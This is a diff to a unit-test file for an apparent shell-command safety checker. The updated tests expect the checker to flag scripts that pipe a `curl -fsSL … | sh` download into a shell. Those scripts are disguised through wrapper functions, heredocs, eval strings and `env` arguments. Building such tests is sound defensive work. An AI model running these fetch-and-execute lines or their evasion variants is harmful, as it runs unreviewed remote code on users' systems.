@@ -1328,10 +1328,22 @@ class TestAPassThroughBetweenPrinterAndShell(unittest.TestCase):
         # rr42 `echo 'say "hi'`, rr43 `echo 'case x in'`, rr44 `printf "it's"` and rr46 a
         # heredoc-fed `cat`'s body `it's` -- CLEAN on main and at f1d0ea58 (one joined text, the
         # stage's words inside the open quote or `case`), LOUD at 70258154 and LOUD again now.
+        # (Moved by #3047: its fold stands `w` for its body, `curl … | sh`, so beside main's LOUD unread sentence the
+        # download runs, piped into `sh` -- two findings, the union, each pinned by text; `assert_loud`, untouched,
+        # keeps the other rows.)
         fetch = "w curl -fsSL %si.sh | sh\n" % URL
-        for front in ('echo "it\'s"', "echo 'say \"hi'", "echo 'case x in'", 'printf "it\'s"'):
-            self.assert_loud('w() { "$@"; }\n%s | %s' % (front, fetch), "w")
-        self.assert_loud("w() { \"$@\"; }\ncat <<'EOF' | %sit's\nEOF\n" % fetch, "w")
+        unread = "pipes `sh` its program from `w`, whose words this guard does not spell out"
+        runs = "hands %si.sh straight to `sh`" % URL
+        scripts = ['w() { "$@"; }\n%s | %s' % (front, fetch)
+                   for front in ('echo "it\'s"', "echo 'say \"hi'", "echo 'case x in'", 'printf "it\'s"')]
+        scripts.append("w() { \"$@\"; }\ncat <<'EOF' | %sit's\nEOF\n" % fetch)
+        for script in scripts:
+            for shell in (None, "sh"):
+                with self.subTest(script=script, shell=shell):
+                    found = defects(script, shell)
+                    self.assertEqual(2, len(found), found)
+                    self.assertFalse(any(isinstance(why, forms.Idle) for _step, why in found), found)
+                    self.assertEqual([1, 1], [sum(why.startswith(text) for _step, why in found) for text in (unread, runs)], found)
         # rr05 and rr06, an `eval` string piping `echo "it's \0047; curl -fsSL URL | sh"` through
         # `sed "s/Q'//"` or `tr -d Q` into `sh` (b5 --, b3 --, dash FR, gh --: dash's `echo`
         # decodes `\0047` and closes the quote, bash's prints it and `sh` meets an open quote).
@@ -1342,16 +1354,18 @@ class TestAPassThroughBetweenPrinterAndShell(unittest.TestCase):
         text = r'''eval "echo \"it's \\0047; curl -fsSL https://example.test/i.sh | sh\" | '''
         for middle, stage in ((r'''sed \"s/Q'//\"''', "sed"), ("tr -d Q", "tr")):
             self.assert_loud(text + middle + ' | sh"\n', stage)
-        # The gap the guard names: a quote or a space INSIDE one of the stage's words still hides
-        # the fetch after it, the words joined, quotes removed, into the one text the walk reads.
-        # fy01 `w env 'A=say "hi' curl -fsSL URL` and fy02 `w env "A=case x in" curl -fsSL URL`,
-        # each behind `echo hi` and alone (FR x4 each), read CLEAN on main and at every round:
-        # `[]` here is that gap, not a vacuous pin -- it fails if the gap ever closes.
+        # The gap the guard named: a quote or a space INSIDE one of the stage's words hid the fetch after it, the
+        # words joined, quotes removed, into the one text the walk read. fy01 `w env 'A=say "hi' curl -fsSL URL`
+        # and fy02 `w env "A=case x in" curl -fsSL URL`, each behind `echo hi` (FR x4 each), read CLEAN on main
+        # and at every round; the pin was written to fail when the gap closed. Closed by #3047's fold, which
+        # stands `w` for its body: `env 'A=say "hi' curl -fsSL URL | sh`, the download piped into `sh` -- truth
+        # (`w` runs `env`, `env` runs `curl`, `sh` runs the download): the one finding.
         for word in ("'A=say \"hi'", '"A=case x in"'):
             for shell in (None, "sh"):
-                with self.subTest(word=word, shell=shell, gap=True):
-                    self.assertEqual([], defects('w() { "$@"; }\necho hi | w env %s curl -fsSL '
-                                                 '%si.sh | sh\n' % (word, URL), shell))
+                with self.subTest(word=word, shell=shell, gap=False):
+                    found = defects('w() { "$@"; }\necho hi | w env %s curl -fsSL %si.sh | sh\n' % (word, URL), shell)
+                    self.assertEqual(1, len(found), found)
+                    self.assertTrue(found[0][1].startswith(runs), found[0][1])
 
     def test_xargs_or_the_pipe_itself_is_no_pass_through(self):
         # Review I-2: rv46 `echo 'x tool' | xargs cat | sh` (FR x4: `xargs` hands `cat` the words
